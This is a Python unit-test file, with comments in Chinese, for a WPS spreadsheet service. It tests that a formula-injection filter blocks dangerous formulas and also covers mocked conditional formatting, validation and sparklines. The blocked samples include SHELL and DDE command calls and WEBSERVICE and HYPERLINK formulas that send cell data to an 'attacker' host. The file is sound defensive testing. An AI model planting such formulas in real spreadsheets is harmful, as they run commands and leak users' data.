"""CalcService 单元测试 — 重点覆盖公式注入、单元格值校验与高级格式"""

import pytest

from tests.conftest import MockApp, MockComBackend
from wps_cli.exceptions import ValidationError
from wps_cli.services.calc_service import (
    CalcService,
    _check_formula_safe,
    _coerce_cell_value,
)
from wps_cli.services.session_manager import SessionManager


def _make_svc() -> CalcService:
    return CalcService(manager=SessionManager(backend=MockComBackend()))


class TestFormulaSafety:
    """C-1：公式注入的核心防御"""

    def test_safe_formula_accepted(self):
        _check_formula_safe("=SUM(A1:A10)")
        _check_formula_safe("=IF(A1>0, B1, C1)")
        _check_formula_safe("=VLOOKUP(A1, B:C, 2, FALSE)")

    def test_must_start_with_equals(self):
        with pytest.raises(ValidationError, match="'='"):
            _check_formula_safe("SUM(A1:A10)")

    @pytest.mark.parametrize(
        "danger",
        [
            '=SHELL("cmd /c calc.exe")',
            "=shell('cmd')",
            '=DDE("cmd","/c whoami","")',
            '=DDEAUTO("a", "b", "c")',
            '=EXEC("calc")',
            '=HYPERLINK("http://attacker/"&A1, "x")',
            '=CALL("x","y","z")',
            '=REGISTER("x","y","z")',
            '= SHELL ( "calc" )',  # 空格混淆
            # H-2 第二轮新增
            '=WEBSERVICE("http://attacker/?d="&A1)',
            '=FILTERXML(WEBSERVICE("..."), "//x")',
            '=RTD("server","a","b")',
            '=IMPORTDATA("http://attacker/")',
            '=_XLFN.WEBSERVICE("http://attacker/")',
            "=ENCODEURL(A1)",
        ],
    )
    def test_dangerous_formulas_blocked(self, danger):
        with pytest.raises(ValidationError, match="禁止"):
            _check_formula_safe(danger)


class TestCellValueCoercion:
    """H-5：cell_set 的值不能以 = 开头（公式注入二次路径）"""

    def test_plain_string_ok(self):
        assert _coerce_cell_value("hello") == "hello"

    def test_number_ok(self):
        assert _coerce_cell_value(123) == 123

    def test_formula_like_string_rejected(self):
        with pytest.raises(ValidationError, match="公式"):
            _coerce_cell_value("=1+1")

    def test_formula_with_leading_space_still_rejected(self):
        with pytest.raises(ValidationError):
            _coerce_cell_value('   =SHELL("cmd")')


class TestCalcServiceUnit:
    """少量直接覆盖 service 方法的快速测试，依赖 MockApp"""

    def test_cell_set_blocks_formula_via_value(self):
        svc = _make_svc()
        app = MockApp("calc")

        # 让 _ws 走通：注入最小骨架
        class _R:
            def __init__(self):
                self.Value = None
                self.Formula = None

        class _Sheet:
            def __init__(self):
                self._r = _R()

            def Range(self, ref):  # noqa: N802 - 模拟 COM API 命名
                return self._r

        app.ActiveSheet = _Sheet()
        with pytest.raises(ValidationError):
            svc.cell_set(app, "A1", '=DDE("cmd","/c whoami","")')

    def test_cell_formula_blocks_dangerous(self):
        svc = _make_svc()
        app = MockApp("calc")

        class _R:
            Formula = None

        class _Sheet:
            def Range(self, ref):  # noqa: N802
                return _R()

        app.ActiveSheet = _Sheet()
        with pytest.raises(ValidationError):
            svc.cell_formula(app, "A1", '=SHELL("cmd")')


# ── 条件格式 / 数据验证 / 迷你图 Mock 测试 ──
# 设计参考: iOfficeAI/OfficeCLI (Apache 2.0)


class _FakeFormatCondition:
    """模拟 COM FormatCondition 对象"""

    def __init__(self, index: int, collection: "_FakeFormatConditions | None" = None):
        self.Index = index
        self.Type = 1
        self.Operator = 5
        self.Formula1 = ""
        self.Formula2 = ""
        self.Interior = _FakeInterior()
        self.Font = _FakeFont()
        self.StopIfTrue = False
        self._first_priority = False
        self.AppliesTo = _FakeRange("A1:A10")
        self._collection = collection

    def SetFirstPriority(self):
        self._first_priority = True

    def SetLastPriority(self):
        self._first_priority = False

    def Delete(self):
        if self._collection is not None:
            self._collection._items.pop(self.Index, None)


class _FakeInterior:
    def __init__(self):
        self.Color = 0


class _FakeFont:
    def __init__(self):
        self.Color = 0


class _FakeFormatConditions:
    """模拟 COM FormatConditions 集合"""

    def __init__(self):
        self._items: dict[int, _FakeFormatCondition] = {}
        self._next_idx = 1

    def Add(self, Type=1, Operator=5, Formula1="", Formula2="",
            TextOperator=None, String=None):
        idx = self._next_idx
        fc = _FakeFormatCondition(idx, collection=self)
        fc.Type = Type
        fc.Operator = Operator
        fc.Formula1 = Formula1 or String or ""
        fc.Formula2 = Formula2 or ""
        self._items[idx] = fc
        self._next_idx += 1
        return fc

    @property
    def Count(self):
        return len(self._items)

    def __call__(self, index):
        return self._items[index]

    def Delete(self):
        self._items.clear()


class _FakeValidation:
    """模拟 COM Validation 对象"""

    def __init__(self):
        self.Type = 0
        self.Formula1 = ""
        self.Formula2 = ""
        self.InCellDropdown = False
        self.ErrorTitle = ""
        self.ErrorMessage = ""
        self._count = 0
        self._items: dict[int, _FakeValidation] = {}

    def Add(self, Type=0, AlertStyle=0, Operator=0, Formula1="", Formula2=""):
        self.Type = Type
        self.Formula1 = Formula1
        self.Formula2 = Formula2

    def Delete(self):
        pass

    @property
    def Count(self):
        return self._count

    def __call__(self, index):
        return self._items.get(index, None)


class _FakeSparklineGroup:
    def __init__(self):
        self.Index = 1


class _FakeSparklineGroups:
    def Add(self, Type=0, SourceData=""):
        return _FakeSparklineGroup()


class _FormatTestSheet:
    """测试用工作表的完整 SIM 骨架"""

    def __init__(self):
        self._format_conditions = _FakeFormatConditions()
        self._validation = _FakeValidation()
        self._sparkline_groups = _FakeSparklineGroups()

    def Range(self, ref):
        r = self._range_for(ref)
        r.FormatConditions = self._format_conditions
        r.Validation = self._validation
        r.SparklineGroups = self._sparkline_groups
        return r

    def _range_for(self, ref):
        return _FakeRange(ref)

    @property
    def Cells(self):
        r = _FakeRange("A1")
        r.FormatConditions = self._format_conditions
        r.Validation = self._validation
        return r

    @property
    def UsedRange(self):
        r = _FakeRange("A1")
        r.Validation = self._validation
        return r


class _FakeRange:
    def __init__(self, address):
        self.Address = address
        self.FormatConditions = None
        self.Validation = None
        self.SparklineGroups = None


class TestConditionalFormatting:
    """C-2：条件格式服务"""

    def test_add_cellvalue_greaterthan(self):
        svc = _make_svc()
        app = MockApp("calc")
        sheet = _FormatTestSheet()
        app.ActiveSheet = sheet

        idx = svc.conditional_format_add(
            app, "A1:A10", cf_type="cellvalue",
            operator="greaterthan", formula1="100",
        )
        assert idx >= 1
        fcs = sheet._format_conditions
        assert fcs.Count >= 1

    def test_add_formulabased(self):
        svc = _make_svc()
        app = MockApp("calc")
        sheet = _FormatTestSheet()
        app.ActiveSheet = sheet

        idx = svc.conditional_format_add(
            app, "A1:A10", cf_type="formulabased",
            operator="", formula1="=A1>100",
        )
        assert idx >= 1

    def test_add_contains_uses_text_or_formula_fallback(self):
        svc = _make_svc()
        app = MockApp("calc")
        sheet = _FormatTestSheet()
        app.ActiveSheet = sheet

        idx = svc.conditional_format_add(
            app, "A1:A10", cf_type="cellvalue",
            operator="contains", formula1="关键",
        )
        assert idx >= 1

    def test_list_returns_entries(self):
        svc = _make_svc()
        app = MockApp("calc")
        sheet = _FormatTestSheet()
        app.ActiveSheet = sheet

        svc.conditional_format_add(app, "A1:A10", formula1="100")
        result = svc.conditional_format_list(app)
        assert len(result) >= 1
        assert "index" in result[0]

    def test_delete_single(self):
        svc = _make_svc()
        app = MockApp("calc")
        sheet = _FormatTestSheet()
        app.ActiveSheet = sheet

        svc.conditional_format_add(app, "A1:A10", formula1="100")
        svc.conditional_format_delete(app, 1)
        assert sheet._format_conditions.Count == 0

    def test_delete_all(self):
        svc = _make_svc()
        app = MockApp("calc")
        sheet = _FormatTestSheet()
        app.ActiveSheet = sheet

        svc.conditional_format_add(app, "A1:A10", formula1="100")
        svc.conditional_format_add(app, "B1:B10", formula1="200")
        svc.conditional_format_delete(app, 0)
        assert sheet._format_conditions.Count == 0

    def test_set_priority(self):
        svc = _make_svc()
        app = MockApp("calc")
        sheet = _FormatTestSheet()
        app.ActiveSheet = sheet

        idx = svc.conditional_format_add(app, "A1:A10", formula1="100")
        # 不应抛异常
        svc.conditional_format_set_priority(app, idx, 1)


class TestDataValidation:
    """C-3：数据验证服务"""

    def test_add_list_validation(self):
        svc = _make_svc()
        app = MockApp("calc")
        sheet = _FormatTestSheet()
        app.ActiveSheet = sheet

        svc.data_validation_add(
            app, "B1:B10", validation_type="list",
            formula1="苹果,香蕉,橙子",
        )
        assert sheet._validation.Type == 3  # XL_DV_LIST

    def test_add_whole_validation(self):
        svc = _make_svc()
        app = MockApp("calc")
        sheet = _FormatTestSheet()
        app.ActiveSheet = sheet

        svc.data_validation_add(
            app, "C1:C10", validation_type="whole",
            formula1="1", formula2="100",
        )
        assert sheet._validation.Type == 1  # XL_DV_WHOLE

    def test_delete_validation(self):
        svc = _make_svc()
        app = MockApp("calc")
        sheet = _FormatTestSheet()
        app.ActiveSheet = sheet

        svc.data_validation_add(app, "B1:B10", formula1="选项")
        # 不应抛异常
        svc.data_validation_delete(app, "B1:B10")


class TestSparklines:
    """C-4：迷你图服务"""

    def test_add_line_sparkline(self):
        svc = _make_svc()
        app = MockApp("calc")
        sheet = _FormatTestSheet()
        app.ActiveSheet = sheet

        idx = svc.sparkline_add(
            app, "F1:F10", spark_type="line", source_data="A1:E10",
        )
        assert idx == 1

    def test_add_column_sparkline(self):
        svc = _make_svc()
        app = MockApp("calc")
        sheet = _FormatTestSheet()
        app.ActiveSheet = sheet

        idx = svc.sparkline_add(
            app, "G1:G10", spark_type="column", source_data="A1:E10",
        )
        assert idx == 1
